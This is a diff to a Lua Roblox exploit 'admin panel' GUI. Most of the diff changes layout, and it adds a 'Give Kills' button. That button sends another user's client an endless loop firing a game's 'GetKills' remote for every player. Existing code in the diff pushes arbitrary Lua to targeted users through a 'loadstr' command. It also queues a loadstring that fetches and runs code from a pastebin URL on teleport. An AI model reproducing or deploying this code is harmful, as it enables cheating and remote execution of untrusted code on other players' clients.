@@ -1,5 +1,4 @@
--- Gui to Lua
--- Version: 3.2
+-- ADMIN OPBGGUI
 
 -- Instances:
 
@@ -52,6 +51,12 @@ local UIGradient_10 = Instance.new("UIGradient")
 local UICorner_10 = Instance.new("UICorner")
 local TextLabel_6 = Instance.new("TextLabel")
 local UISizeConstraint_8 = Instance.new("UISizeConstraint")
+local GiveKillsButton = Instance.new("TextButton")
+local UIGradient_11 = Instance.new("UIGradient")
+local UICorner_11 = Instance.new("UICorner")
+local TextLabel_7 = Instance.new("TextLabel")
+local UISizeConstraint_9 = Instance.new("UISizeConstraint")
+local NameLabel = Instance.new("TextLabel")
 
 --Properties:
 
@@ -65,7 +70,7 @@ TopBar.Active = true
 TopBar.BackgroundColor3 = Color3.fromRGB(4, 0, 67)
 TopBar.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TopBar.BorderSizePixel = 0
-TopBar.Position = UDim2.new(0.0169280116, 0, 0.473251015, 0)
+TopBar.Position = UDim2.new(0.0303400215, 0, 0.279492438, 0)
 TopBar.Size = UDim2.new(0, 357, 0, 30)
 TopBar.ZIndex = 2
 
@@ -119,13 +124,14 @@ Main.BackgroundColor3 = Color3.fromRGB(3, 0, 39)
 Main.BorderColor3 = Color3.fromRGB(0, 0, 0)
 Main.BorderSizePixel = 0
 Main.LayoutOrder = -5
-Main.Position = UDim2.new(4.3103924e-08, 0, 0.148491412, 0)
-Main.Size = UDim2.new(0, 357, 0, 213)
+Main.Position = UDim2.new(0, 0, 0.148491412, 0)
+Main.Size = UDim2.new(0, 357, 0, 284)
 
 UICorner_2.CornerRadius = UDim.new(0, 20)
 UICorner_2.Parent = Main
 
 UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
+UIGradient_2.Rotation = 45
 UIGradient_2.Parent = Main
 
 UserBox.Name = "UserBox"
@@ -181,7 +187,7 @@ Frame.Size = UDim2.new(0, 357, 0, 136)
 UIGridLayout.Parent = Frame
 UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
 UIGridLayout.CellPadding = UDim2.new(0, 10, 0, 5)
-UIGridLayout.CellSize = UDim2.new(0, 50, 0, 10)
+UIGridLayout.CellSize = UDim2.new(0, 50, 0, 5)
 
 ChatButton.Name = "ChatButton"
 ChatButton.Parent = Frame
@@ -399,9 +405,62 @@ UISizeConstraint_8.Parent = JoinServerButton
 UISizeConstraint_8.MaxSize = Vector2.new(121, 33)
 UISizeConstraint_8.MinSize = Vector2.new(121, 33)
 
+GiveKillsButton.Name = "GiveKillsButton"
+GiveKillsButton.Parent = Frame
+GiveKillsButton.BackgroundColor3 = Color3.fromRGB(15, 15, 70)
+GiveKillsButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+GiveKillsButton.BorderSizePixel = 0
+GiveKillsButton.Position = UDim2.new(0.559292972, 0, 0.569248855, 0)
+GiveKillsButton.Size = UDim2.new(0, 121, 0, 33)
+GiveKillsButton.AutoButtonColor = false
+GiveKillsButton.Font = Enum.Font.SourceSans
+GiveKillsButton.Text = ""
+GiveKillsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+GiveKillsButton.TextSize = 16.000
+GiveKillsButton.TextWrapped = true
+
+UIGradient_11.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(111, 111, 111)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
+UIGradient_11.Parent = GiveKillsButton
+
+UICorner_11.CornerRadius = UDim.new(0.00999999978, 3)
+UICorner_11.Parent = GiveKillsButton
+
+TextLabel_7.Parent = GiveKillsButton
+TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_7.BackgroundTransparency = 1.000
+TextLabel_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_7.BorderSizePixel = 0
+TextLabel_7.Position = UDim2.new(0.115103222, 0, 0.159090906, 0)
+TextLabel_7.Size = UDim2.new(0, 93, 0, 22)
+TextLabel_7.Font = Enum.Font.Unknown
+TextLabel_7.Text = "Give Kills"
+TextLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_7.TextSize = 14.000
+
+UISizeConstraint_9.Parent = GiveKillsButton
+UISizeConstraint_9.MaxSize = Vector2.new(121, 33)
+UISizeConstraint_9.MinSize = Vector2.new(121, 33)
+
+NameLabel.Name = "NameLabel"
+NameLabel.Parent = TopBar
+NameLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+NameLabel.BackgroundTransparency = 1.000
+NameLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+NameLabel.BorderSizePixel = 0
+NameLabel.Position = UDim2.new(0.018872343, 0, 0.148491412, 0)
+NameLabel.Size = UDim2.new(0, 159, 0, 25)
+NameLabel.ZIndex = 3
+NameLabel.Font = Enum.Font.SourceSans
+NameLabel.Text = "OPBGGUI Admin Panel"
+NameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+NameLabel.TextScaled = true
+NameLabel.TextSize = 14.000
+NameLabel.TextWrapped = true
+NameLabel.TextXAlignment = Enum.TextXAlignment.Left
+
 -- Scripts:
 
-local function TOODT_fake_script() -- Main.LocalScript 
+local function QHHMZDR_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
 
 	local topbar = script.Parent.Parent
@@ -469,19 +528,7 @@ local function TOODT_fake_script() -- Main.LocalScript
 			topbar.Transparency=topbar.Transparency+speed
 			task.wait(0.01)
 		end
-		if topbar.Transparency>=1 then
-            script.Parent.Parent.Parent:Destroy()
-        else
-            while topbar.Transparency<1 do
-			    for _,v in topbar:GetDescendants() do
-				    pcall(function()
-				    	v['Transparency'] = v['Transparency']+speed
-				    end)
-			    end
-			    topbar.Transparency=topbar.Transparency+speed
-			    task.wait(0.01)
-		    end
-        end
+		script.Parent.Parent.Parent:Destroy()
 	end)
 	
 	
@@ -530,5 +577,24 @@ local function TOODT_fake_script() -- Main.LocalScript
 		local str = "function tpJobId(jobId) game:GetService(\"TeleportService\"):TeleportToPlaceInstance(game.PlaceId, jobId, game.Players.LocalPlayer) end queue_on_teleport(\"loadstring(game:HttpGet('https://pastebin.com/raw/WMQdb4zD'))()\") tpJobId('" .. jobId .. "')"
 		sendCommand(script.Parent.UserBox.Text,'loadstr',str)
 	end)
+	
+	script.Parent.Frame.GiveKillsButton.MouseButton1Click:Connect(function()
+		sendCommand(script.Parent.UserBox.Text,'loadstr',[[
+		local players = game:GetService("Players")
+	local localPlayer = players.LocalPlayer
+	local remotes = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("GetKills")
+	while task.wait() do
+	    local playerList = players:GetPlayers()
+	
+	    for i = 1, #playerList do
+	        local player = playerList[i]
+	        if player ~= localPlayer then
+	            remotes:FireServer(player)
+	        end
+	    end
+	end
+	
+		]])
+	end)
 end
-coroutine.wrap(TOODT_fake_script)()
+coroutine.wrap(QHHMZDR_fake_script)()
